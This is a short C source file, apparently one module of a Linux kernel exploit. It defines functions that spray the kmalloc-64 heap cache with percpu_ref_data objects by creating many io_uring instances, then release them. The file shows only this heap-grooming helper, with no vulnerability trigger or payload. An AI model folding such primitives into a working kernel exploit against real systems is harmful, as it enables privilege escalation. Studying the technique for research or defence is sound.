#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <syscall.h>
#include <linux/io_uring.h>

#include "uring.h"
#include "log.h"
#include "util.h"

/**
 * spray_uring(): Spray different caches of the kernel heap
 * @spray_size: Size to spray
 * @fd_buffer: Buffer used to store information about the allocated objects
 *
 * This spray is mainly used to spray the cache `kmalloc-64` with `percpu_ref_data` objects
 */
void spray_uring(uint32_t spray_size, struct fd_uring *fd_buffer) {

    for (uint64_t i = 0; i < spray_size; i++) {

        fd_buffer[i].params = malloc(sizeof(struct io_uring_params));
        if (!fd_buffer[i].params)
            do_error_exit("malloc");
        memset(fd_buffer[i].params, 0, sizeof(struct io_uring_params));

        fd_buffer[i].fd = io_uring_setup(SPRAY_NB_ENTRIES, fd_buffer[i].params);
        if (fd_buffer[i].fd < 0)
            do_error_exit("io_uring_create");

    }
}

/**
 * release_uring(): Release percpu_ref_data objects allocated
 * @fd_buffer: Buffer that stores io_ring_ctx fds
 * @buffer_size: Size of the previous buffer
 */
void release_uring(struct fd_uring *fd_buffer, uint32_t buffer_size) {

    for (uint32_t i = 0; i < buffer_size; i++) {
        close(fd_buffer[i].fd);
    }
    free(fd_buffer);
}
